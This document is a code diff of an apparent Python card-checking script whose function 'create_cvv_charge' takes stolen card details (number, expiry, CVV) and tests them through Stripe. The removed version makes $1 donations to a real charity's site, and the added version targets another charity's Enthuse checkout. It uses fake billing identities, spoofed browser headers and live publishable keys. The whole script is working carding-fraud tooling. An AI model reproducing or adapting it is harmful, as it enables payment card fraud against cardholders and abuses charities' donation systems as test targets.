@@ -1,17 +1,11 @@
 import asyncio
 import random
-import time
-import json
-import base64,bs4
-import random
-import urllib3
-import uuid
-from faker import Faker
 from fake_useragent import UserAgent
 import requests
 from FUNC.defs import *
 import re
 from bs4 import BeautifulSoup
+
 
 
 
@@ -27,164 +21,103 @@ def gets(s, start, end):
                 return None
 
 
-def generate_fake_email():
-    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
-    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randint(5,10)))
-    numbers = ''.join(random.choice('1234567890') for i in range(random.randint(4,5)))
-    domain = random.choice(domains)
-    return name + numbers + '@' + domain
-
-def time_page():
-    numbers = ''.join(random.choice('1234567890') for i in range(6))
-    return numbers
-
-fake = Faker()
-name = fake.first_name()
-email = generate_fake_email()
-country = fake.country()
-address1 = fake.street_address()
-address2 = fake.secondary_address()
-city = fake.city()
-statee = fake.state()
-state = fake.state_abbr()
-zip = fake.zipcode_in_state(state)
-phone = "+202" + fake.numerify("#########")
-agent = fake.user_agent()
-
-ptime = time_page()
-guid = str(uuid.uuid4())
-muid = str(uuid.uuid4())
-sid = str(uuid.uuid4())
-session = requests.Session()
-
 
 async def create_cvv_charge(fullz , session):
     try:
         cc , mes , ano , cvv = fullz.split("|")
 
 
-        session =requests.Session()
+        r =requests.Session()
         email="craish"+str(random.randint(548,98698))+"niki@gmail.com"
 
         headers = {
-    'authority': 'pipelineforchangefoundation.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': agent,
-}
-        
-        req1 = session.get("https://pipelineforchangefoundation.com/donate/", headers=headers,  verify=False, timeout=30)
-        nonce = re.findall(r'name="_charitable_donation_nonce" value="(.*?)"', req1.text)[0]
-        form_id = re.findall(r'name="charitable_form_id" value="(.*?)"', req1.text)[0]
-                
-        session.cookies.update(req1.cookies)
-        headers = {
-    'authority': 'api.stripe.com',
     'accept': 'application/json',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'accept-language': 'en-US,en;q=0.5',
+    'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
     'origin': 'https://js.stripe.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
     'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-site',
-    'user-agent': agent,
-        }
-
-        data = {
-        'type':'card',
-        'billing_details[name]':f'{name}',
-        'billing_details[email]':f'{email}',
-        'billing_details[address][city]':f'{city}',
-        'billing_details[address][country]':'US',
-        'billing_details[address][line1]':f'{address1}',      
-        'billing_details[address][postal_code]':f'{zip}',     
-        'billing_details[address][state]':'Texas',
-        'billing_details[phone]':'+202814880301',
-        'card[number]':f'{cc}',
-        'card[cvc]':f'{cvv}',
-        'card[exp_month]':f'{mes}',
-        'card[exp_year]':f'{ano}',
-        'guid':f'{guid}',
-        'muid':f'{muid}',
-        'sid':f'{sid}',
-        'referrer':'https://pipelineforchangefoundation.com',
-        'time_on_page': ptime,
-        'key':'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
 }
-        
-        req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data,  verify=False, timeout=30)
-        try:
-            id=req2.json()['id']
-        except:
-                pass
-        print(id)
+    
+        data = {
+    'type':'card',
+  'billing_details[address][city]':'Dighton',
+  'billing_details[address][country]':'US',
+  'billing_details[address][line1]':'Williams Street',
+  'billing_details[address][line2]':'Bristol County', 
+  'billing_details[address][postal_code]':'02764',    
+  'billing_details[address][state]':'MA',
+  'billing_details[email]':email,   
+  'billing_details[name]':'Mr Johhanes Adams',        
+  'card[number]':f'{cc}',
+  'card[cvc]':f'{cvv}',
+  'card[exp_month]':f'{mes}',
+  'card[exp_year]':f'{ano}',
+  'guid':'b68757cd-62bf-45a7-804e-e843a5a40fa947d237',
+  'muid':'6bf2a8a4-2430-4395-a2ea-df427f5695f227112b',
+  'sid':'784a0881-f9d2-4410-8a77-f9ceb701427c22cb0a', 
+  'pasted_fields':'number',
+  'payment_user_agent':'stripe.js/796a7b92df; stripe-js-v3/796a7b92df; split-card-element',
+  'referrer':'https://renewable-world.enthuse.com',
+  'time_on_page':'128928',
+  'key':'pk_live_ftYOjqGtfMkXICnngj1VQh99',
+}
+            
+
+
+        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        print(response.text)
+
+        id= response.json()['id']
+        await asyncio.sleep(3)
+
         headers = {
-    'authority': 'pipelineforchangefoundation.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://pipelineforchangefoundation.com',
-    'referer': 'https://pipelineforchangefoundation.com/donate/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'en-US,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://renewable-world.enthuse.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://renewable-world.enthuse.com/cp/48d59/RWGOWA24?&key=17b4469b-0d5a-4576-905f-44949f132ce7',
+    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': agent,
-    'x-requested-with': 'XMLHttpRequest',
-        }
+    'sec-gpc': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+}
+    
+        json_data = {
+    'key': '17b4469b-0d5a-4576-905f-44949f132ce7',
+    'paymentMethodId': id,
+    'threeDSecureSupported': True,
+    'stripeConnectedAccountId': 'acct_1JMrw02m8T0aiZrz',
+    'cardCountryCode': 'US',
+}
 
-        data = {
-            'charitable_form_id': form_id,
-            f'{form_id}': '',
-            '_charitable_donation_nonce': nonce,
-            '_wp_http_referer': '/donate/',
-            'campaign_id': '690',
-            'description': 'Donate to Pipeline for Change Foundation',
-            'ID': '0',
-            'recurring_donation': 'once',
-            'custom_recurring_donation_amount': '',
-            'recurring_donation_period': 'once',
-            'donation_amount': 'custom',
-            'custom_donation_amount': '1.00',
-            'first_name': name,
-            'last_name': name,
-            'email': email,
-            'address': address1,
-            'address_2': '',
-            'city': city,
-            'state': state,
-            'postcode': zip,
-            'country': 'US',
-            'phone': phone,
-            'gateway': 'stripe',
-            'stripe_payment_method': id,
-            'action': 'make_donation',
-            'form_action': 'make_donation',
-        }
-
-        req3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data,  verify=False, timeout=30)
-        print(req3.text)
+        response = r.post(
+    'https://renewable-world.enthuse.com/checkoutstate/pay/stripe',
+    headers=headers,
+    json=json_data,
+)
+        print(response.text)
         await asyncio.sleep(2)
-        return req3
+        return response
 
     except Exception as e:
         return str(e)
     
-
-
-
+    # print(response.json()['message'])
+    
